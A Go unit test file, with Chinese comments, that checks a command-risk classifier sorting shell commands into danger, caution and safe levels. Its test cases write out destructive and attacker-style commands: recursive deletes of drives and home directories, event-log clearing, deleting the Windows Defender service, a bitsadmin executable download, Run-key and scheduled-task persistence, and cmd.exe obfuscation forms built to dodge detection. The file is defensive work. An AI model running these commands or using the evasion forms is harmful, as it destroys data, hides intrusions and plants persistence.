package core

import "testing"

// 删除类命令的开关与顺序无关，换个写法不能把高危降级成 safe。
func TestCommandRiskSwitchOrder(t *testing.T) {
	cases := []struct {
		cmd  string
		want RiskLevel
	}{
		// 原有定序条目，行为不变。
		{"rd /s /q x", RiskDanger},
		{"rm -rf /", RiskDanger},
		{`del /f /s /q C:\*`, RiskDanger},
		// 换顺序 / 拆开 / 连写 / 别名。
		{`rd /q /s D:\proj`, RiskDanger},
		{"rd /s/q build", RiskDanger},
		{"RD /Q /S build", RiskDanger},
		{"rmdir /q /s src", RiskDanger},
		{"erase /s /q *", RiskDanger},
		{"del /a /f *.tmp", RiskDanger},
		{"rm -r -f ~", RiskDanger},
		{"rm -f -r build", RiskDanger},
		{"rm -Rf build", RiskDanger},
		{"rm --recursive --force build", RiskDanger},
		{`C:\Windows\System32\cmd.exe /c rd /q /s x`, RiskDanger},
		{"cmd /d /c rmdir /q /s x", RiskDanger},
		{"go test ./... && rd /q /s dist", RiskDanger},
		// cmd.exe 二次展开：不能按字面判 safe。
		{"r^d /s /q C:\\proj", RiskCaution},
		{"for %i in (/s) do @rd %i /q C:\\proj", RiskCaution},
		{`cmd /v:on /c "set S=/s& rd !S! /q C:\proj"`, RiskCaution},
		{"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d C:\\x.exe", RiskCaution},
		// 不应误伤。
		{"rd build", RiskSafe},
		{"rm -r build", RiskSafe},
		{"git rm -r -f --cached x", RiskSafe},
		{"echo rd /q /s x", RiskSafe},
		{"del notes.txt", RiskCaution},
		{"echo hello", RiskSafe},
		{"mkdir build", RiskCaution},
	}
	for _, c := range cases {
		if got := CommandRisk(c.cmd); got != c.want {
			t.Errorf("CommandRisk(%q) = %s, want %s", c.cmd, got, c.want)
		}
	}
}

// 会丢弃未提交改动或清掉系统痕迹的命令，此前不在黑名单里，被判为 safe。
func TestCommandRiskDiscardAndSystem(t *testing.T) {
	cases := []struct {
		cmd  string
		want RiskLevel
	}{
		// git：没有撤销手段的丢弃操作。
		{"git clean -fdx", RiskDanger},
		{"git clean -d -f", RiskDanger},
		{"git clean --force", RiskDanger},
		{"git -C D:\\proj clean -xdf", RiskDanger},
		{"git --git-dir .git clean -fdx", RiskDanger},
		{"git --work-tree D:\\proj clean -fdx", RiskDanger},
		{"git rm -r -f .", RiskDanger},
		{"git reset --hard HEAD~5", RiskDanger},
		{"git checkout -- .", RiskDanger},
		{"git checkout .", RiskDanger},
		{"git checkout -f main", RiskDanger},
		{"git restore .", RiskDanger},
		{"git restore --staged --worktree a.go", RiskDanger},
		{"git stash clear", RiskDanger},
		{"git stash drop", RiskDanger},
		{"go build ./... && git reset --hard", RiskDanger},
		// 系统：清日志、删服务。
		{"wevtutil cl System", RiskDanger},
		{"wevtutil clear-log Security", RiskDanger},
		{"sc delete WinDefend", RiskDanger},
		{`sc \\pc01 delete svc`, RiskDanger},
		// 下载 / 持久化：抬到 caution。
		{`bitsadmin /transfer j http://x/a.exe %TEMP%\a.exe`, RiskCaution},
		{`schtasks /create /tn up /tr C:\x.exe /sc onlogon`, RiskCaution},
		{"sc config svc start= auto", RiskCaution},
		// 不应误伤。
		{"git clean -n", RiskSafe},
		{"git clean -n -d", RiskSafe},
		{"git reset HEAD a.go", RiskSafe},
		{"git reset --soft HEAD~1", RiskSafe},
		{"git checkout main", RiskSafe},
		{"git checkout -b feature", RiskSafe},
		{"git restore --staged a.go", RiskSafe},
		{"git stash", RiskSafe},
		{"git stash pop", RiskSafe},
		{"git status", RiskSafe},
		{"echo git reset --hard", RiskSafe},
		{"wevtutil qe System /c:5", RiskSafe},
		{"sc query", RiskSafe},
		{"schtasks /query", RiskSafe},
		{"bitsadmin /list", RiskSafe},
	}
	for _, c := range cases {
		if got := CommandRisk(c.cmd); got != c.want {
			t.Errorf("CommandRisk(%q) = %s, want %s", c.cmd, got, c.want)
		}
	}
}
